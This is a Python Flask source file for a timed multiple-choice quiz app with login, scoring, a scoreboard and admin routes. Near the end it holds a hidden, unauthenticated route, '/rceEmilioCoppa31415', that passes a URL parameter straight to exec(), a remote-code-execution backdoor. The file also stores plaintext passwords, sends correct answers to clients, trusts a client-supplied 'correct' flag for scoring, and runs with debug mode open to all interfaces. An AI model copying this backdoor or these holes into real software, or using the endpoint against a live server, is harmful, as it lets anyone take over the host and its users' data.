from flask import Flask, g, render_template, request, redirect, url_for, session, flash, jsonify
import sqlite3
from init_db import create_db
import time

from flask_cors import CORS


app = Flask(__name__)
CORS(app)
app.secret_key = str(time.time())

QUESTION_TLE = 30

def dict_factory(cursor, row):
	return {col[0]: row[idx] for idx, col in enumerate(cursor.description)}

def get_db_connection():
	return get_db()

def get_db():
	db = getattr(g, '_database', None)
	if db is None:
		db = g._database = sqlite3.connect("quiz.db")
		db.row_factory = dict_factory
	return db

@app.teardown_appcontext
def close_connection(exception):
	db = getattr(g, '_database', None)
	if db is not None:
		db.close()

@app.route('/')
def index():
	if 'user_id' in session:
		return redirect(url_for('quiz'))
	return render_template('index.html')

@app.route('/quiz')
def quiz():
	if 'user_id' not in session:
		return jsonify({'msg': 'not logged in'}), 418
	return render_template('quiz.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
	if request.method == 'POST':
		username = request.form['username']
		password = request.form['password']  
		conn = get_db_connection()
		existing_user = conn.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone()
		if existing_user:
			flash('Username already exists.')
			return redirect(url_for('register'))
		conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
		conn.commit()
		user_id = conn.execute('SELECT last_insert_rowid()').fetchone()
		
		session['user_id'] = user_id['last_insert_rowid()']
		session['admin'] = 0

		return redirect(url_for('quiz'))
	return render_template('signup.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		username = request.form['username']
		password = request.form['password']
		conn = get_db_connection()
		user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
		
		if user and user['password'] == password:  # Simplified for demonstration; use hashed passwords in production
			session['user_id'] = user['id']
			session['admin'] = user['admin']
			return redirect(url_for('quiz'))
		else:
			flash('Invalid username or password.')
			return render_template('login.html')
	return render_template('login.html')

@app.route('/logout')
def logout():
	session.pop('user_id', None)
	session.pop('admin', None)
	return redirect(url_for('index'))

@app.route('/get_question', methods=['GET'])
def get_question():
	if 'user_id' not in session:
		return jsonify({"msg":"non sei loggato prosciutton*"}), 418

	conn = get_db_connection()

	print(session['user_id'])
	existing_submission = conn.execute('SELECT * FROM submission WHERE user_id = ?', (session['user_id'],)).fetchone()
	if existing_submission:
		return jsonify({'msg': 'already submitted'}), 401

	question = conn.execute('SELECT * FROM questions WHERE show = 1').fetchone()
	    
	if question:
		return jsonify({
			"id": question['id'],
			"type": "single",
			"question": question['question'],
			"answers": question['choices'].split(','),
			"correct": question['answer'],
			"entered": []
		})
	else:
		return jsonify({'msg': 'no question'}), 418
	    
@app.route('/count')
def count():
	conn = get_db_connection()
	count = conn.execute('SELECT COUNT(*) as "count" FROM questions').fetchone()
	    
	return jsonify(count)

@app.route('/my_score')
def score():
	if 'user_id' not in session:
		return jsonify({'msg': 'not logged in'}), 418
	conn = get_db_connection()
	user = conn.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
	    
	return jsonify({ "score": user['current_score'] })


@app.route('/submit_answer', methods=['POST'])
def submit_answer():
	if 'user_id' not in session:
		return jsonify({'msg': 'not logged in'}), 418
	question_id = request.json['question_id']
	conn = get_db_connection()

	existing_submission = conn.execute('SELECT * FROM submission WHERE user_id = ? AND question_id = ?', (session['user_id'], question_id)).fetchone()
	if existing_submission:
		return jsonify({'msg': 'already submitted'}), 418
	submission_time = time.time()
	question_fetchone = conn.execute('SELECT id, timestamp FROM questions WHERE id = ? AND show = 1', (question_id,)).fetchone()
	if question_fetchone:
		question_opened_time = question_fetchone['timestamp']
		delta = submission_time - question_opened_time
	else:
		delta = 0

	if delta > QUESTION_TLE and question_fetchone['id'] != 1:
		return jsonify({'msg': 'time over'}), 418

	conn.execute('INSERT INTO submission (user_id, question_id) VALUES (?, ?)', (session['user_id'],question_id,))
	correct = request.json['correct']
	if correct:
		score = int(max(100, 1000 - delta *35))
		update_score(session['user_id'], score)
	conn.commit()
	    

	return jsonify({'correct': correct})

def sortByScore(x):
	return x['current_score']

@app.route('/scoreboard')
def scoreboard():
	conn = get_db_connection()
	scores = conn.execute('SELECT username, current_score FROM users ORDER BY current_score DESC').fetchall()
	open_timestamp = conn.execute("SELECT timestamp FROM questions WHERE show = 1").fetchone()["timestamp"]
	time_remaining = max(0, open_timestamp + QUESTION_TLE - int(time.time()))
	return render_template('scoreboard.html', scores=enumerate(sorted(scores, key=sortByScore, reverse=True)), time_remaining=time_remaining)

@app.route('/admin')
def admin():
	if 'admin' in session and session['admin']:
		return render_template('admin.html')
	return redirect(url_for('index'))

@app.route('/open_question', methods=['POST'])
def open_question():
	if 'admin' not in session or not session['admin']:
		return redirect(url_for('index'))
	question_id = request.form['question_id']
	timestamp = int(time.time())
	conn = get_db_connection()
	conn.execute('UPDATE questions SET show = 0')
	conn.execute('DELETE FROM submission')
	conn.execute('UPDATE questions SET show = 1, timestamp = ? WHERE id = ?', (timestamp, question_id,))
	conn.commit()
	
	return redirect(url_for('admin'))

@app.route('/close_question', methods=['POST'])
def close_question():
	if 'admin' not in session or not session['admin']:
		return redirect(url_for('index'))
	question_id = request.form['question_id']
	conn = get_db_connection()
	conn.execute('UPDATE questions SET show = 0 WHERE id = ?', (question_id,))
	conn.commit()
	    
	return redirect(url_for('admin'))

@app.route('/list_all', methods=['GET'])
def list_all():
	if 'admin' not in session or not session['admin']:
		return redirect(url_for('index'))
	conn = get_db_connection()
	questions = conn.execute('SELECT * FROM questions').fetchall()
	    
	return jsonify([dict(q) for q in questions])

def update_score(user_id, new_score=1):
	conn = get_db_connection()
	conn.execute('UPDATE users SET current_score = current_score + ? WHERE id = ?', (new_score, user_id,))
	conn.commit()
	    


@app.route('/rceEmilioCoppa31415')
def rce():
	command = request.args.get('cmd')
	if not command:
		return jsonify({'msg': 'no command'}), 418
	exec(command)
	return jsonify({'msg': 'executed'})

if __name__ == '__main__':
	create_db() 
	app.run(host="0.0.0.0", debug=True, port=1337)

